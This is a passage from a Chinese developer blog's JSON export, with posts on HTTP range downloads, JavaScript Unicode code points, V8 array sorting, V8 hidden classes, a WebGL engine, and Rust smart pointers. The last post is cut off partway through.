注意\n\n\n我们在分段下载的时候，可能在下载的过程中，文件修改了。这是合成的文件就出了问题。下载完后可以使用If-Match\n[https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/If-Match]\n（If-Range）通过判断Etag是否相等，来判断文件版本。如果Etag变化了，返回416的状态码。需要重新下载。","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2018-08-03T12:12:39.000Z","created_by":"1","updated_at":"2018-10-03T08:27:06.000Z","updated_by":"1","published_at":"2018-08-03T13:21:19.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d364","uuid":"598929f1-bad6-404e-aa31-cdc1520bd2ac","title":"codePointAt和fromCodePoint","slug":"codepointathe-fromcodepoint","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"字符的 Unicode 表示法\\nJavaScript 允许采用\\\\uxxxx形式表示一个字符，其中xxxx表示字符的 Unicode 码点。\\n```\\n\\\"\\\\u0061\\\" // \\\"a\\\"\\n```\\n但是只限于\\\\u0000~\\\\uFFFF的。如下，要使用两个才能代表大于\\\\uFFFF的字符。\\n```\\n\\\"\\\\ud83c\\\\udf0f\\\"  //  \\\"🌏\\\"\\n\\\"\\\\u20BB7\\\"  //  \\\"₻7\\\"\\n```\\n\\n> charCodeAt <=> fromCharCode\\n\\n都是ES5中提出的方法。charCodeAt 是UTF-16 字符转换成编号。String.fromCharCode 是通过编号转字符串。但是这两个不能识别 32 位的 UTF-16 字符（Unicode 编号大于0xFFFF,如`'🌏'(127759)`）,如图是不能识别的。js会识别'🌏'的长度为2.分成两部分。如下。\\n```\\n'🌏'.length===2 //true\\n'🌏'.charCodeAt(0)  // 55356\\n'🌏'.charCodeAt(1)  // 57103\\n'\\\\ud83c\\\\udf0f' // \\\"🌏\\\"\\n```\\n\\n\\n\\n> codePointAt<=> fromCodePoint\\n\\n这是es6的方法，能够正确处理 4 个字节储存的字符。\\n![](/content/images/2018/08/QQ--20180804230557.png)\\n\\n而且es6还改进了，将码点放入大括号，就能正确解读该字符。\\n```\\n\\\"\\\\u{20BB7}\\\"\\n// \\\"𠮷\\\"\\n\\n\\\"\\\\u{41}\\\\u{42}\\\\u{43}\\\"\\n// \\\"ABC\\\"\\n\\nlet hello = 123;\\nhell\\\\u{6F} // 123\\n\\n'\\\\u{1F680}' === '\\\\uD83D\\\\uDE80'\\n// true\\n```\\n\\n字符串遍历，因此在遍历大于\\\\uffff的字符时，用for是bug的。 要用es6 Iterator（遍历器）。\\n```\\nlet text = \\\"🌏\\\";\\n\\nfor (let i = 0; i < text.length; i++) {\\n  console.log(text[i]);\\n}\\n// �\\n// �\\n\\nfor (let i of text) {\\n  console.log(i);\\n}\\n```\\n\\nJavaScript 共有 6 种方法可以表示一个字符。\\n```\\n'\\\\z' === 'z'  // true\\n'\\\\172' === 'z' // true\\n'\\\\x7A' === 'z' // true\\n'\\\\u007A' === 'z' // true\\n'\\\\u{7A}' === 'z' // true\\n```\\n\\n[字符串的扩展](http://es6.ruanyifeng.com/#docs/string)\\n\\n\\n\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><p>字符的 Unicode 表示法<br>\nJavaScript 允许采用\\uxxxx形式表示一个字符，其中xxxx表示字符的 Unicode 码点。</p>\n<pre><code>&quot;\\u0061&quot; // &quot;a&quot;\n</code></pre>\n<p>但是只限于\\u0000~\\uFFFF的。如下，要使用两个才能代表大于\\uFFFF的字符。</p>\n<pre><code>&quot;\\ud83c\\udf0f&quot;  //  &quot;🌏&quot;\n&quot;\\u20BB7&quot;  //  &quot;₻7&quot;\n</code></pre>\n<blockquote>\n<p>charCodeAt &lt;=&gt; fromCharCode</p>\n</blockquote>\n<p>都是ES5中提出的方法。charCodeAt 是UTF-16 字符转换成编号。String.fromCharCode 是通过编号转字符串。但是这两个不能识别 32 位的 UTF-16 字符（Unicode 编号大于0xFFFF,如<code>'🌏'(127759)</code>）,如图是不能识别的。js会识别'🌏'的长度为2.分成两部分。如下。</p>\n<pre><code>'🌏'.length===2 //true\n'🌏'.charCodeAt(0)  // 55356\n'🌏'.charCodeAt(1)  // 57103\n'\\ud83c\\udf0f' // &quot;🌏&quot;\n</code></pre>\n<blockquote>\n<p>codePointAt&lt;=&gt; fromCodePoint</p>\n</blockquote>\n<p>这是es6的方法，能够正确处理 4 个字节储存的字符。<br>\n<img src=\"/content/images/2018/08/QQ--20180804230557.png\" alt=\"\"></p>\n<p>而且es6还改进了，将码点放入大括号，就能正确解读该字符。</p>\n<pre><code>&quot;\\u{20BB7}&quot;\n// &quot;𠮷&quot;\n\n&quot;\\u{41}\\u{42}\\u{43}&quot;\n// &quot;ABC&quot;\n\nlet hello = 123;\nhell\\u{6F} // 123\n\n'\\u{1F680}' === '\\uD83D\\uDE80'\n// true\n</code></pre>\n<p>字符串遍历，因此在遍历大于\\uffff的字符时，用for是bug的。 要用es6 Iterator（遍历器）。</p>\n<pre><code>let text = &quot;🌏&quot;;\n\nfor (let i = 0; i &lt; text.length; i++) {\n  console.log(text[i]);\n}\n// �\n// �\n\nfor (let i of text) {\n  console.log(i);\n}\n</code></pre>\n<p>JavaScript 共有 6 种方法可以表示一个字符。</p>\n<pre><code>'\\z' === 'z'  // true\n'\\172' === 'z' // true\n'\\x7A' === 'z' // true\n'\\u007A' === 'z' // true\n'\\u{7A}' === 'z' // true\n</code></pre>\n<p><a href=\"http://es6.ruanyifeng.com/#docs/string\">字符串的扩展</a></p>\n<!--kg-card-end: markdown-->","comment_id":"168","plaintext":"字符的 Unicode 表示法\nJavaScript 允许采用\\uxxxx形式表示一个字符，其中xxxx表示字符的 Unicode 码点。\n\n\"\\u0061\" // \"a\"\n\n\n但是只限于\\u0000~\\uFFFF的。如下，要使用两个才能代表大于\\uFFFF的字符。\n\n\"\\ud83c\\udf0f\"  //  \"🌏\"\n\"\\u20BB7\"  //  \"₻7\"\n\n\n> charCodeAt <=> fromCharCode\n\n\n都是ES5中提出的方法。charCodeAt 是UTF-16 字符转换成编号。String.fromCharCode 是通过编号转字符串。但是这两个不能识别\n32 位的 UTF-16 字符（Unicode 编号大于0xFFFF,如'🌏'(127759)\n）,如图是不能识别的。js会识别'🌏'的长度为2.分成两部分。如下。\n\n'🌏'.length===2 //true\n'🌏'.charCodeAt(0)  // 55356\n'🌏'.charCodeAt(1)  // 57103\n'\\ud83c\\udf0f' // \"🌏\"\n\n\n> codePointAt<=> fromCodePoint\n\n\n这是es6的方法，能够正确处理 4 个字节储存的字符。\n\n\n而且es6还改进了，将码点放入大括号，就能正确解读该字符。\n\n\"\\u{20BB7}\"\n// \"𠮷\"\n\n\"\\u{41}\\u{42}\\u{43}\"\n// \"ABC\"\n\nlet hello = 123;\nhell\\u{6F} // 123\n\n'\\u{1F680}' === '\\uD83D\\uDE80'\n// true\n\n\n字符串遍历，因此在遍历大于\\uffff的字符时，用for是bug的。 要用es6 Iterator（遍历器）。\n\nlet text = \"🌏\";\n\nfor (let i = 0; i < text.length; i++) {\n  console.log(text[i]);\n}\n// �\n// �\n\nfor (let i of text) {\n  console.log(i);\n}\n\n\nJavaScript 共有 6 种方法可以表示一个字符。\n\n'\\z' === 'z'  // true\n'\\172' === 'z' // true\n'\\x7A' === 'z' // true\n'\\u007A' === 'z' // true\n'\\u{7A}' === 'z' // true\n\n\n字符串的扩展 [http://es6.ruanyifeng.com/#docs/string]","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2018-08-04T14:55:41.000Z","created_by":"1","updated_at":"2018-08-04T17:19:33.000Z","updated_by":"1","published_at":"2018-08-04T16:22:19.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d365","uuid":"c9f8c63d-b1ea-4d4e-b1b8-ac9b9778d752","title":"JS 数组排序","slug":"js-shu-zu-pai-xu","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"```\\nvar data = [\\n  {value: 4}, \\n  {value: 2}, \\n  {value: undefined}, \\n  {value: undefined}, \\n  {value: 1}, \\n  {value: undefined}, \\n  {value: undefined}, \\n  {value: 7}, \\n  {value: undefined}, \\n  {value: 4}\\n];\\n```\\ndata 是个数组，数组的每一项都是一个拥有 value 作为 key 的对象，值为数字或者 undefined。\\n```\\ndata\\n  .sort((x, y) => x.value - y.value)\\n  .map(x => x.value);\\n\\ndata\\n  .map(x => x.value)\\n  .sort((x, y) => x - y)\\n```\\n\\n在 ES6 规范 22.1.3.24 节写道：\\n\\n```\\nCalling comparefn(a,b) always returns the same value v when given a specific pair of values a and b as its two arguments. Furthermore, Type(v) is Number, and v is not NaN. Note that this implies that exactly one of a < b, a = b, and a > b will be true for a given pair of a and b.\\n```\\n简单翻译一下就是：第二个参数 comparefn 返回一个数字，并且不是 NaN。一个注意事项是，对于参与比较的两个数 a 小于 b、a 等于 b、a 大于 b 这三种情况必须有一个为 true。\\n\\n所以严格意义上来说，这段代码是有 bug 的，因为比较的结果出现了 NaN。\\n\\n在 MDN 文档上还有一个细节：\\n```\\n如果 comparefn(a, b) 等于 0， a 和 b 的相对位置不变。备注：ECMAScript 标准并不保证这一行为，而且也不是所有浏览器都会遵守。\\n翻译成编程术语就是：sort 排序算法是不稳定排序。\\n```\\n```\\n// %RemoveArrayHoles returns -1 if fast removal is not supported.\\nvar num_non_undefined = %RemoveArrayHoles(array, length);\\n\\nif (num_non_undefined == -1) {\\n  // There were indexed accessors in the array.\\n  // Move array holes and undefineds to the end using a Javascript function\\n  // that is safe in the presence of accessors.\\n  num_non_undefined = SafeRemoveArrayHoles(array);\\n}\\n```\\n中间的注释：Move array holes and undefineds to the end using a Javascript function。排序之前会把数组里面的 undefined 移动到最后。因此第二个排序算法会把 undefined 移动到最后，然后对剩余的数据 [4,2,1,7,4] 进行排序。\\n而在第一种写法时，数组的每一项都是一个 Object，然后最 Object 调用 x.value - y.value 进行计算，当 undefined 参与运算时比较的结果是 NaN。当返回 NaN 时 V8 怎么处理的呢？我前面标注过，再贴一次：\\n```\\nvar order = comparefn(tmp, element);\\nif (order > 0) {  // <---- 这里\\n  a[j + 1] = tmp;\\n} else {\\n  break; // \\n}\\n```\\n```\\n[1, 23, 2, 3].sort() \\n// [1,2,23,3] js默认排序是字典序。\\n```\\n\\n[从 V8 源码看 JS 数组排序的诡异问题](https://zhuanlan.zhihu.com/p/28482937)\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><pre><code>var data = [\n  {value: 4}, \n  {value: 2}, \n  {value: undefined}, \n  {value: undefined}, \n  {value: 1}, \n  {value: undefined}, \n  {value: undefined}, \n  {value: 7}, \n  {value: undefined}, \n  {value: 4}\n];\n</code></pre>\n<p>data 是个数组，数组的每一项都是一个拥有 value 作为 key 的对象，值为数字或者 undefined。</p>\n<pre><code>data\n  .sort((x, y) =&gt; x.value - y.value)\n  .map(x =&gt; x.value);\n\ndata\n  .map(x =&gt; x.value)\n  .sort((x, y) =&gt; x - y)\n</code></pre>\n<p>在 ES6 规范 22.1.3.24 节写道：</p>\n<pre><code>Calling comparefn(a,b) always returns the same value v when given a specific pair of values a and b as its two arguments. Furthermore, Type(v) is Number, and v is not NaN. Note that this implies that exactly one of a &lt; b, a = b, and a &gt; b will be true for a given pair of a and b.\n</code></pre>\n<p>简单翻译一下就是：第二个参数 comparefn 返回一个数字，并且不是 NaN。一个注意事项是，对于参与比较的两个数 a 小于 b、a 等于 b、a 大于 b 这三种情况必须有一个为 true。</p>\n<p>所以严格意义上来说，这段代码是有 bug 的，因为比较的结果出现了 NaN。</p>\n<p>在 MDN 文档上还有一个细节：</p>\n<pre><code>如果 comparefn(a, b) 等于 0， a 和 b 的相对位置不变。备注：ECMAScript 标准并不保证这一行为，而且也不是所有浏览器都会遵守。\n翻译成编程术语就是：sort 排序算法是不稳定排序。\n</code></pre>\n<pre><code>// %RemoveArrayHoles returns -1 if fast removal is not supported.\nvar num_non_undefined = %RemoveArrayHoles(array, length);\n\nif (num_non_undefined == -1) {\n  // There were indexed accessors in the array.\n  // Move array holes and undefineds to the end using a Javascript function\n  // that is safe in the presence of accessors.\n  num_non_undefined = SafeRemoveArrayHoles(array);\n}\n</code></pre>\n<p>中间的注释：Move array holes and undefineds to the end using a Javascript function。排序之前会把数组里面的 undefined 移动到最后。因此第二个排序算法会把 undefined 移动到最后，然后对剩余的数据 [4,2,1,7,4] 进行排序。<br>\n而在第一种写法时，数组的每一项都是一个 Object，然后最 Object 调用 x.value - y.value 进行计算，当 undefined 参与运算时比较的结果是 NaN。当返回 NaN 时 V8 怎么处理的呢？我前面标注过，再贴一次：</p>\n<pre><code>var order = comparefn(tmp, element);\nif (order &gt; 0) {  // &lt;---- 这里\n  a[j + 1] = tmp;\n} else {\n  break; // \n}\n</code></pre>\n<pre><code>[1, 23, 2, 3].sort() \n// [1,2,23,3] js默认排序是字典序。\n</code></pre>\n<p><a href=\"https://zhuanlan.zhihu.com/p/28482937\">从 V8 源码看 JS 数组排序的诡异问题</a></p>\n<!--kg-card-end: markdown-->","comment_id":"169","plaintext":"var data = [\n  {value: 4}, \n  {value: 2}, \n  {value: undefined}, \n  {value: undefined}, \n  {value: 1}, \n  {value: undefined}, \n  {value: undefined}, \n  {value: 7}, \n  {value: undefined}, \n  {value: 4}\n];\n\n\ndata 是个数组，数组的每一项都是一个拥有 value 作为 key 的对象，值为数字或者 undefined。\n\ndata\n  .sort((x, y) => x.value - y.value)\n  .map(x => x.value);\n\ndata\n  .map(x => x.value)\n  .sort((x, y) => x - y)\n\n\n在 ES6 规范 22.1.3.24 节写道：\n\nCalling comparefn(a,b) always returns the same value v when given a specific pair of values a and b as its two arguments. Furthermore, Type(v) is Number, and v is not NaN. Note that this implies that exactly one of a < b, a = b, and a > b will be true for a given pair of a and b.\n\n\n简单翻译一下就是：第二个参数 comparefn 返回一个数字，并且不是 NaN。一个注意事项是，对于参与比较的两个数 a 小于 b、a 等于 b、a 大于 b\n这三种情况必须有一个为 true。\n\n所以严格意义上来说，这段代码是有 bug 的，因为比较的结果出现了 NaN。\n\n在 MDN 文档上还有一个细节：\n\n如果 comparefn(a, b) 等于 0， a 和 b 的相对位置不变。备注：ECMAScript 标准并不保证这一行为，而且也不是所有浏览器都会遵守。\n翻译成编程术语就是：sort 排序算法是不稳定排序。\n\n\n// %RemoveArrayHoles returns -1 if fast removal is not supported.\nvar num_non_undefined = %RemoveArrayHoles(array, length);\n\nif (num_non_undefined == -1) {\n  // There were indexed accessors in the array.\n  // Move array holes and undefineds to the end using a Javascript function\n  // that is safe in the presence of accessors.\n  num_non_undefined = SafeRemoveArrayHoles(array);\n}\n\n\n中间的注释：Move array holes and undefineds to the end using a Javascript\nfunction。排序之前会把数组里面的 undefined 移动到最后。因此第二个排序算法会把 undefined 移动到最后，然后对剩余的数据\n[4,2,1,7,4] 进行排序。\n而在第一种写法时，数组的每一项都是一个 Object，然后最 Object 调用 x.value - y.value 进行计算，当 undefined\n参与运算时比较的结果是 NaN。当返回 NaN 时 V8 怎么处理的呢？我前面标注过，再贴一次：\n\nvar order = comparefn(tmp, element);\nif (order > 0) {  // <---- 这里\n  a[j + 1] = tmp;\n} else {\n  break; // \n}\n\n\n[1, 23, 2, 3].sort() \n// [1,2,23,3] js默认排序是字典序。\n\n\n从 V8 源码看 JS 数组排序的诡异问题 [https://zhuanlan.zhihu.com/p/28482937]","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2018-08-10T05:47:31.000Z","created_by":"1","updated_at":"2018-08-10T09:06:06.000Z","updated_by":"1","published_at":"2018-08-10T09:06:06.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d366","uuid":"e78d1f2c-4d22-43a4-afbb-1149ca0d45ba","title":"如何写出高性能的js代码一","slug":"ru-he-xie-chu-gao-xing-neng-de-jsdai-ma","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"### 如何写出高性能的js代码\\n\\n下面是v8引擎优化js性能的\\n\\n#### 快速访问属性\\njs是一门动态语言，属性是可以动态添加，动态删除的。大部分js引擎使用字典式数据结构作为对象属性的存储。每个属性访问都需要动态查找来解决该属性在内存中的位置，这样是很慢的。在其他静态语言中，在编译时，已经确定了偏移，属性在内存中按照偏移直接获取。只需一个指令。\\nv8为了减少对象访问属性的时间。不使用动态查找访问属性，而是，动态地在幕后创建隐藏类。在V8中，一个对象当一个新的属性添加时会改变它的隐藏类。\\n\\n如下一个函数：\\n\\n```\\nfunction Point(x, y) {\\n  this.x = x;\\n  this.y = y;\\n}\\n```\\n当执行 `new Point(1,2)` 时，会创建一个对应Point的隐藏类C0。这时还是一个空对象。\\n\\n![map_trans_a](https://github.com/v8/v8/wiki/images/map_trans_a.png)\\n\\n当执行 `this.x = x;` 时,这时对象上面添加了`x`属性，v8会基于隐藏类C0创建隐藏类C1。这时`Point`对应的隐藏类是C1。\\n\\n![](https://github.com/v8/v8/wiki/images/map_trans_b.png)\\n\\n当执行 `this.y = y;` 时,这时对象上面又添加了`y`属性，v8会基于隐藏类C1创建隐藏类C2。并对应隐藏类C2。\\n\\nv8这样做有两个好处。1.属性访问不需要查字典，V8使用经典的基于类的优化，2.内联缓存。有关内联缓存的更多信息，请参见[Efficient Implementation of the Smalltalk-80 System](http://portal.acm.org/citation.cfm?id=800017.800542)。\\n\\n根据如上分析，我们创建对象的时候，不要随意添加删除属性。\\n\\n```\\n// 慢\\nvar a={};\\na.name=123;\\na.age=11;\\n// 快\\nvar a={name:123,age,123}\\n```\\n\\n在某些情况下，如大量的添加属性，删除属性。 Fast mode（快速模式）会转成 Dictionary mode（字典模式）。这种情况是可以通过黑魔法转换的，如下\\n\\n1. Dictionary mode（字典模式）：字典模式也成为哈希表模式，V8 引擎使用哈希表来存储对象。\\n2. Fast mode（快速模式）：快速模式使用类似 C 语言的 struct 来表示对象。\\n\\n如下代码\\n```\\nfunction toFastProperties(obj) {\\n    /*jshint -W027*/\\n    function f() {}\\n    f.prototype = obj;\\n    ASSERT(\\\"%HasFastProperties\\\", true, obj);\\n    return f;\\n    eval(obj);\\n}\\n```\\nBluebird 代码中 f.prototype = obj 是使属性访问变快的关键。当把一个对象设置为另一个对象的 prototype 时，V8 引擎对对象的结构重新进行了优化。\\n```\\nvar a={name:123};\\ntoFastProperties(a);\\n```\\n\\n\\n\\n\\n[Design-Elements](https://github.com/v8/v8/wiki/Design-Elements)\\n\\n[开启 V8 对象属性的“fast”模式](https://zhuanlan.zhihu.com/p/25069272)\\n\\n[JavaScript 引擎基础：Shapes 和 Inline Caches](https://zhuanlan.zhihu.com/p/38202123)\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><h3 id=\"js\">如何写出高性能的js代码</h3>\n<p>下面是v8引擎优化js性能的</p>\n<h4 id=\"\">快速访问属性</h4>\n<p>js是一门动态语言，属性是可以动态添加，动态删除的。大部分js引擎使用字典式数据结构作为对象属性的存储。每个属性访问都需要动态查找来解决该属性在内存中的位置，这样是很慢的。在其他静态语言中，在编译时，已经确定了偏移，属性在内存中按照偏移直接获取。只需一个指令。<br>\nv8为了减少对象访问属性的时间。不使用动态查找访问属性，而是，动态地在幕后创建隐藏类。在V8中，一个对象当一个新的属性添加时会改变它的隐藏类。</p>\n<p>如下一个函数：</p>\n<pre><code>function Point(x, y) {\n  this.x = x;\n  this.y = y;\n}\n</code></pre>\n<p>当执行 <code>new Point(1,2)</code> 时，会创建一个对应Point的隐藏类C0。这时还是一个空对象。</p>\n<p><img src=\"https://github.com/v8/v8/wiki/images/map_trans_a.png\" alt=\"map_trans_a\"></p>\n<p>当执行 <code>this.x = x;</code> 时,这时对象上面添加了<code>x</code>属性，v8会基于隐藏类C0创建隐藏类C1。这时<code>Point</code>对应的隐藏类是C1。</p>\n<p><img src=\"https://github.com/v8/v8/wiki/images/map_trans_b.png\" alt=\"\"></p>\n<p>当执行 <code>this.y = y;</code> 时,这时对象上面又添加了<code>y</code>属性，v8会基于隐藏类C1创建隐藏类C2。并对应隐藏类C2。</p>\n<p>v8这样做有两个好处。1.属性访问不需要查字典，V8使用经典的基于类的优化，2.内联缓存。有关内联缓存的更多信息，请参见<a href=\"http://portal.acm.org/citation.cfm?id=800017.800542\">Efficient Implementation of the Smalltalk-80 System</a>。</p>\n<p>根据如上分析，我们创建对象的时候，不要随意添加删除属性。</p>\n<pre><code>// 慢\nvar a={};\na.name=123;\na.age=11;\n// 快\nvar a={name:123,age,123}\n</code></pre>\n<p>在某些情况下，如大量的添加属性，删除属性。 Fast mode（快速模式）会转成 Dictionary mode（字典模式）。这种情况是可以通过黑魔法转换的，如下</p>\n<ol>\n<li>Dictionary mode（字典模式）：字典模式也成为哈希表模式，V8 引擎使用哈希表来存储对象。</li>\n<li>Fast mode（快速模式）：快速模式使用类似 C 语言的 struct 来表示对象。</li>\n</ol>\n<p>如下代码</p>\n<pre><code>function toFastProperties(obj) {\n    /*jshint -W027*/\n    function f() {}\n    f.prototype = obj;\n    ASSERT(&quot;%HasFastProperties&quot;, true, obj);\n    return f;\n    eval(obj);\n}\n</code></pre>\n<p>Bluebird 代码中 f.prototype = obj 是使属性访问变快的关键。当把一个对象设置为另一个对象的 prototype 时，V8 引擎对对象的结构重新进行了优化。</p>\n<pre><code>var a={name:123};\ntoFastProperties(a);\n</code></pre>\n<p><a href=\"https://github.com/v8/v8/wiki/Design-Elements\">Design-Elements</a></p>\n<p><a href=\"https://zhuanlan.zhihu.com/p/25069272\">开启 V8 对象属性的“fast”模式</a></p>\n<p><a href=\"https://zhuanlan.zhihu.com/p/38202123\">JavaScript 引擎基础：Shapes 和 Inline Caches</a></p>\n<!--kg-card-end: markdown-->","comment_id":"170","plaintext":"如何写出高性能的js代码\n下面是v8引擎优化js性能的\n\n快速访问属性\njs是一门动态语言，属性是可以动态添加，动态删除的。大部分js引擎使用字典式数据结构作为对象属性的存储。每个属性访问都需要动态查找来解决该属性在内存中的位置，这样是很慢的。在其他静态语言中，在编译时，已经确定了偏移，属性在内存中按照偏移直接获取。只需一个指令。\nv8为了减少对象访问属性的时间。不使用动态查找访问属性，而是，动态地在幕后创建隐藏类。在V8中，一个对象当一个新的属性添加时会改变它的隐藏类。\n\n如下一个函数：\n\nfunction Point(x, y) {\n  this.x = x;\n  this.y = y;\n}\n\n\n当执行 new Point(1,2) 时，会创建一个对应Point的隐藏类C0。这时还是一个空对象。\n\n\n\n当执行 this.x = x; 时,这时对象上面添加了x属性，v8会基于隐藏类C0创建隐藏类C1。这时Point对应的隐藏类是C1。\n\n\n\n当执行 this.y = y; 时,这时对象上面又添加了y属性，v8会基于隐藏类C1创建隐藏类C2。并对应隐藏类C2。\n\nv8这样做有两个好处。1.属性访问不需要查字典，V8使用经典的基于类的优化，2.内联缓存。有关内联缓存的更多信息，请参见Efficient\nImplementation of the Smalltalk-80 System\n[http://portal.acm.org/citation.cfm?id=800017.800542]。\n\n根据如上分析，我们创建对象的时候，不要随意添加删除属性。\n\n// 慢\nvar a={};\na.name=123;\na.age=11;\n// 快\nvar a={name:123,age,123}\n\n\n在某些情况下，如大量的添加属性，删除属性。 Fast mode（快速模式）会转成 Dictionary\nmode（字典模式）。这种情况是可以通过黑魔法转换的，如下\n\n 1. Dictionary mode（字典模式）：字典模式也成为哈希表模式，V8 引擎使用哈希表来存储对象。\n 2. Fast mode（快速模式）：快速模式使用类似 C 语言的 struct 来表示对象。\n\n如下代码\n\nfunction toFastProperties(obj) {\n    /*jshint -W027*/\n    function f() {}\n    f.prototype = obj;\n    ASSERT(\"%HasFastProperties\", true, obj);\n    return f;\n    eval(obj);\n}\n\n\nBluebird 代码中 f.prototype = obj 是使属性访问变快的关键。当把一个对象设置为另一个对象的 prototype 时，V8\n引擎对对象的结构重新进行了优化。\n\nvar a={name:123};\ntoFastProperties(a);\n\n\nDesign-Elements [https://github.com/v8/v8/wiki/Design-Elements]\n\n开启 V8 对象属性的“fast”模式 [https://zhuanlan.zhihu.com/p/25069272]\n\nJavaScript 引擎基础：Shapes 和 Inline Caches [https://zhuanlan.zhihu.com/p/38202123]","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2018-08-10T09:21:41.000Z","created_by":"1","updated_at":"2018-08-10T09:31:53.000Z","updated_by":"1","published_at":"2018-08-10T09:24:28.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d367","uuid":"fa4bb994-7169-433f-8a77-9fccb7758a08","title":"从零写一个webgl游戏引擎（一）","slug":"cong-ling-xie-yi-ge-webglyou-xi-yin-qing","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"webgl3d的引擎（类库），常见的有threejs,playcanvas,babylonjs。以及unity3d可以用llvm转asmjs 导出webgl。它们都很好用的，自己写一个是为了学习一下webgl原理。github地址 [hypergl](https://github.com/laopo001/hypergl)，主要从上面的3个js webgl框架吸收灵感，还有[从零开始手敲次世代游戏引擎](https://zhuanlan.zhihu.com/c_119702958)的文章。\\n\\n功能\\n\\n* 使用语言typescript，ts是javascirpt的超集，它的类型系统，可以让我在编译就可以排查出大部分bug。\\n* 使用handlebars和handlebars-loader，生成webgl中shader代码，还可以预编译。\\n* 使用webworker多线程，主线程主要是用来gpu渲染，后台线程用来 加载模型，格式化，物理碰撞。（一帧的时间是16ms。在16ms中既要完成js运算，又要完成gpu渲染，数据大了是很难完成的）。\\n* 使用flatbufferjs。在webworker线程给主线程中传递渲染数据。直接移动Arraybuffer，实现高性能传递数据。\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><p>webgl3d的引擎（类库），常见的有threejs,playcanvas,babylonjs。以及unity3d可以用llvm转asmjs 导出webgl。它们都很好用的，自己写一个是为了学习一下webgl原理。github地址 <a href=\"https://github.com/laopo001/hypergl\">hypergl</a>，主要从上面的3个js webgl框架吸收灵感，还有<a href=\"https://zhuanlan.zhihu.com/c_119702958\">从零开始手敲次世代游戏引擎</a>的文章。</p>\n<p>功能</p>\n<ul>\n<li>使用语言typescript，ts是javascirpt的超集，它的类型系统，可以让我在编译就可以排查出大部分bug。</li>\n<li>使用handlebars和handlebars-loader，生成webgl中shader代码，还可以预编译。</li>\n<li>使用webworker多线程，主线程主要是用来gpu渲染，后台线程用来 加载模型，格式化，物理碰撞。（一帧的时间是16ms。在16ms中既要完成js运算，又要完成gpu渲染，数据大了是很难完成的）。</li>\n<li>使用flatbufferjs。在webworker线程给主线程中传递渲染数据。直接移动Arraybuffer，实现高性能传递数据。</li>\n</ul>\n<!--kg-card-end: markdown-->","comment_id":"171","plaintext":"webgl3d的引擎（类库），常见的有threejs,playcanvas,babylonjs。以及unity3d可以用llvm转asmjs\n导出webgl。它们都很好用的，自己写一个是为了学习一下webgl原理。github地址 hypergl\n[https://github.com/laopo001/hypergl]，主要从上面的3个js webgl框架吸收灵感，还有从零开始手敲次世代游戏引擎\n[https://zhuanlan.zhihu.com/c_119702958]的文章。\n\n功能\n\n * 使用语言typescript，ts是javascirpt的超集，它的类型系统，可以让我在编译就可以排查出大部分bug。\n * 使用handlebars和handlebars-loader，生成webgl中shader代码，还可以预编译。\n * 使用webworker多线程，主线程主要是用来gpu渲染，后台线程用来\n   加载模型，格式化，物理碰撞。（一帧的时间是16ms。在16ms中既要完成js运算，又要完成gpu渲染，数据大了是很难完成的）。\n * 使用flatbufferjs。在webworker线程给主线程中传递渲染数据。直接移动Arraybuffer，实现高性能传递数据。","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2018-09-04T05:22:58.000Z","created_by":"1","updated_at":"2018-09-12T11:03:01.000Z","updated_by":"1","published_at":"2018-09-04T05:49:56.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d368","uuid":"c80c21f3-b4c3-487b-bcd4-4bb15db59266","title":"Box<T>,Rc<T>,RefCell<T>,Weak<T>","slug":"box-t-rc-t-refcell-t-weak-t","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"> Box<T>\\n\\n在堆上存储数据，并且可确定大小,不能共享所有权\\n\\n> Rc<T> \\n\\n引用计数智能指针，可以共享所有权，允许相同数据有多个所有者\\n\\n> RefCell<T>\\n\\n对于引用和 Box<T>，借用规则的不可变性作用于编译时。对于 RefCell<T>，这些不可变性作用于 运行时。对于引用，如果违反这些规则，会得到一个编译错误。而对于RefCell<T>，违反这些规则会 panic!。。RefCell<T> 正是用于当你确信代码遵守借用规则，而编译器不能理解和确定的时候。\\n\\n类似于 Rc<T>，RefCell<T> 只能用于单线程场景。如果尝试在多线程上下文中使用RefCell<T>，会得到一个编译错误。\\n\\n\\n######如下为选择 